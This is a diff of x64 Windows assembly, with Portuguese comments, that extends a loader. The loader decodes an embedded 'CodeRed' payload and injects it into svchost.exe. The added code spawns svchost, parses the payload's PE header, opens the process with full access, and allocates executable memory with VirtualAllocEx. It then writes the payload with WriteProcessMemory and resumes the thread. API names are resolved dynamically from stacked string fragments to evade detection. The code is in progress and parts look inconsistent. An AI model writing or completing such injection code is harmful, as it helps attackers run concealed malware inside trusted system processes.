@@ -1,8 +1,29 @@
 [BITS 64]
 global WinMain
 
+section .BSS
+	process db "svchost.exe",0,0
+	
 section .data	
-    struc theProcess
+	
+
+	struc PROCESSINFO
+		.hProcess 		resd 2
+		.hThread 		resd 2
+        .dwProcessId 	resd 1
+        .dwThreadId 	resd 1
+    endstruc
+	
+		
+    ProcInfo istruc PROCESSINFO
+        at PROCESSINFO.hProcess,dd 0
+        at PROCESSINFO.hThread,dd 0
+        at PROCESSINFO.dwProcessId,dw 0
+        at PROCESSINFO.dwThreadId,dw 0
+    iend
+	
+	
+	struc STARTUPINFOA 
         .cb resd 1
         .lpReserved resb 8
         .lpDesktop resb 8
@@ -22,26 +43,27 @@ section .data
         .hStadOutput resd 2
         .hStdError resd 2
     endstruc
+	
 
-    startupinfoa istruc theProcess
-       at theProcess.cb, dd 0
-       at theProcess.lpReserved, db 0
-       at theProcess.lpDesktop, db 0
-       at theProcess.lpTitle, db 0
-       at theProcess.dwX, dd 0
-       at theProcess.dwY, dd 0
-       at theProcess.dwXSize, dd 0
-       at theProcess.dwYSize, dd 0
-       at theProcess.dwXCountChars, dd 0
-       at theProcess.dwYCountChars, dd 0
-       at theProcess.dwFillAttribute, dd 0
-       at theProcess.dwFlags, dd 0
-       at theProcess.wShowWindow, dw 0
-       at theProcess.cbReserved2, dw 0
-       at theProcess.lpReserverd2, db 0
-       at theProcess.hStdInput, dd 0
-       at theProcess.hStadOutput, dd 0
-       at theProcess.hStdError, dd 0
+	startup istruc STARTUPINFOA 
+       at STARTUPINFOA.cb, dd 0
+       at STARTUPINFOA.lpReserved, db 0
+       at STARTUPINFOA.lpDesktop, db 0
+       at STARTUPINFOA.lpTitle, db 0
+       at STARTUPINFOA.dwX, dd 0
+       at STARTUPINFOA.dwY, dd 0
+       at STARTUPINFOA.dwXSize, dd 0
+       at STARTUPINFOA.dwYSize, dd 0
+       at STARTUPINFOA.dwXCountChars, dd 0
+       at STARTUPINFOA.dwYCountChars, dd 0
+       at STARTUPINFOA.dwFillAttribute, dd 0
+       at STARTUPINFOA.dwFlags, dd 0
+       at STARTUPINFOA.wShowWindow, dw 0
+       at STARTUPINFOA.cbReserved2, dw 0
+       at STARTUPINFOA.lpReserverd2, db 0
+       at STARTUPINFOA.hStdInput, dd 0
+       at STARTUPINFOA.hStadOutput, dd 0
+       at STARTUPINFOA.hStdError, dd 0
     iend
 
     TamArqProgram times 8 dq 0
@@ -52,9 +74,18 @@ section .data
     addressAlocadoEx times 8 dq 0
     handle times 8 dq 0
     entrypointTarget times 8 dq 0
-
+	GetSizeTarget times 8 dq 0
+	lpPebImageBase times 8 dq 0
+	openProcessH times 8 dq 0
+	lpContext times 8 dd 0 
+	allocex times 8 dd 0 
+	AddressEntryPoint times 8 dd 0
+	PID times 8 dd 0
+	alloc times 8 dd 0
+	
 	space dd 0
-	process db "svchost.exe"
+	
+
 	
 section .codered
 	CodeRed:
@@ -84,10 +115,10 @@ section .deccode
 	mov r12, rax
 	
 	;Call CreateProcessA
-	lea rdx,[space]
+	lea rdx,[ProcInfo+PROCESSINFO.hProcess]
 	mov [rsp+0x48], rdx
 	xor rdx,rdx
-	lea rdx ,[startupinfoa+theProcess.cb]
+	lea rdx ,[startup+STARTUPINFOA.cb]
 	xor rdi,rdi
 	xor r9,r9
 	mov r9, 0x1
@@ -106,6 +137,8 @@ section .deccode
 	xor r10,r10
 	call r12
 	add rsp, 0x30
+	 
+	mov rdi,rsp
 	
 	call Locate_kernel32
 	call GetProcAddres
@@ -118,9 +151,11 @@ section .deccode
 	lea rdx, [rsp]
 	mov rcx, r8
 	sub rsp, 0x30
+	sub rsp, 0x10
 	call r14
 	mov r12,rax
 	add rsp, 0x30
+	
 	
 	;call VirtualAlloc
 	mov r9d, 0x04
@@ -128,11 +163,11 @@ section .deccode
 	mov rdi, 0xC3500
 	mov edx, edi
 	mov ecx, 0x00
-	sub rsp, 0x30
 	call r12
 	add rsp, 0x30
 	mov rbx,rax
 	mov rdi, rbx
+	mov [alloc], rax
 	
 	mov rax, CodeRed
 	xor rcx,rcx
@@ -146,28 +181,167 @@ section .deccode
 		cmp rcx, 0xC3500
 		jne DecArq
 		
+	mov rcx, rdi
+	mov rax, rdi
+	add rax, 0x3C
+	xor rbx,RBX
+	mov ebx, [eax]
+	mov rax, RCX
+	add rax, rbx
+	add rax, 0x50
+	mov ebx, [eax]
+	mov [GetSizeTarget],ebx
 	
-	;Lookup memset
-	mov rax, "memset"
+	mov [lpPebImageBase], rcx
+	
+	call Locate_kernel32
+	call LoadLibrary
+	mov rbx,rcx
+	loadKernelbase:
+			; Load kernelbase.dll
+			mov rax, "se.dll"     
+			push rax
+			mov rax, "kernelba"
+			push rax
+			mov rcx, rsp
+			sub rsp, 0x30
+			call rsi
+			mov r15,rax
+			add rsp, 0x30
+			add rsp, 0x10
+
+	OpenProcess:
+			;Lookup OpenProcess
+			mov rax, "ess"
+			push rax
+			mov rax, "OpenProc"
+			push rax
+			lea rdx, [rsp]
+			mov rcx, r15
+			sub rsp, 0x30
+			call r14
+			mov r12, rax
+			add rsp, 0x30
+
+			;call OpenProcess
+			xor edx,edx
+			mov r8, [ProcInfo+PROCESSINFO.dwProcessId]
+			mov ecx, 0x1FFFFF
+			sub rsp, 0x30
+			call r12
+			mov rbp, rax
+			add rsp, 0x30
+			mov r13, rax
+			mov [openProcessH], rax
+		
+	call Locate_kernel32
+	VirtualAllocEx:
+		;Lookup VirtualAllocEx
+		mov rax, "llocEx"
+		push rax
+		mov rax, "VirtualA"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r8
+		sub rsp, 0x30
+		call r14
+		mov r12, rax
+
+		mov r15, rbx
+		;call VirtualAllocEx
+		xor rcx,rcx
+		xor rbx,rbx
+		xor rdx,rdx
+		mov r8d, [GetSizeTarget]
+		mov r9d, 0x3000
+		mov [rsp+0x20], dword 0x40
+		mov rcx, r13
+		mov rdi, r13
+		call r12
+		mov rbx, r15
+		mov [allocex],rax
+                               
+                                
+	call Locate_kernel32 
+	mov rbp,rbx
+	mov rsi, r13      
+	call GetProcAddres
+	mov rbx, r15
+	mov r15, r9
+
+	call LoadLibrary
+	mov r13, r15
+	;Load kernelbase.dll
+	mov rax, "se.dll"     
 	push rax
-	lea rdx, [rsp]
-	mov rcx, r15
+	mov rax, "kernelba"
+	push rax
+	mov rcx, rsp
 	sub rsp, 0x30
-	call r14
-	mov r12,rax
+	call rsi
+	mov r15,rax
 	add rsp, 0x30
-	
-	;call memset
-	lea rax, [rbp+0x220]
-	mov r8d, 0x4d0
-	mov edx, 0x00
-	mov rcx, rax
-	call r12
-	sub rsp, 0x30
-	
-	
-ret
-	
+	add rsp, 0x10
+
+	;delta
+
+WriteProcess:
+		;Lookup WriteProcessMemory
+		mov rax, "ry"
+		push rax
+		mov rax, "cessMemo"
+		push rax
+		mov rax, "WritePro"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r15
+		sub rsp, 0x30
+		call r14
+		mov r12, rax
+		add rsp, 0x30
+
+		;call WriteProcessMemory
+		mov r9d,[GetSizeTarget]
+		xor ebx,ebx
+		mov r8,[lpPebImageBase]
+		mov [rsp+0x20], rbx
+		mov rdx, [allocex]
+		mov rcx, [openProcessH]
+		call r12
+		mov rbp, rax
+		add rsp, 0x30     
+	   
+
+	Resume:
+		call Locate_kernel32 
+		mov rax, "read"
+		push rax
+		mov rax, "ResumeTh"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r8
+		sub rsp, 0x30
+		call r14
+		mov r12, rax
+		;call ResumeTheread
+		mov rax, [ProcInfo+PROCESSINFO.hThread]
+		mov rcx, rax
+		call R12
+		
+	call Locate_kernel32
+	Exit:                             
+		;lookup ExitProcess
+		mov rax, "ess"
+		push rax
+		mov rax, "ExitProc"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r8
+		sub rsp, 0x30
+		call r14
+		mov r12 ,rax
+		call r12
+	;END
 	
 			
  
@@ -250,6 +424,7 @@ ret
 			sub rsp, 0x30
 			call r14
 			add rsp, 0x30
+			add rsp, 0x08
 			mov r12, rax
 	
 			; call printf
@@ -261,8 +436,8 @@ ret
 			sub rsp, 0x30
 			call r12
 			add rsp, 0x30
-			add rsp, 0x18
-    ret
+			add rsp, 0x10
+    retn
 
     PegaNomeDoaquivo:
 			; Lookup scanf
@@ -473,7 +648,7 @@ ret
 			mov rcx, r8; # Copia o endereço base da Kernel32  para RCX
 			sub rsp, 0x30; # Make some room on the stack
 			call r14; # Call GetProcessAddress
-			add rsp, 0x30; # Remove espaço locdo na pilha
+			add rsp, 0x30; # Remove espaço alocado na pilha
 			add rsp, 0x10; # Remove a string alocada de  LoadLibrary 
 			mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
         ret
